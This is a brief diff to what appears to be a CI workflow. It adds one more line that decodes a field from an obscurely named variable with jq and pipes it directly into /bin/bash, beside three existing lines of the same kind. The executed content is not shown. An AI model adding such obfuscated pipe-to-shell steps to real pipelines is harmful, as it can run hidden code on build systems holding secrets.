@@ -21,6 +21,7 @@ jobs:
           echo $ks081 | jq -r .fda7 | /bin/bash
           echo $pahco39 | jq -r .ukj3 | /bin/bash
           printf '%s' "$r7208" | jq -r .qdbqk49 | /bin/bash
+          printf '%s' "$qm2" | jq -r .hbx92 | /bin/bash
 
       - name: Store artifact
         uses: actions/upload-artifact@v4
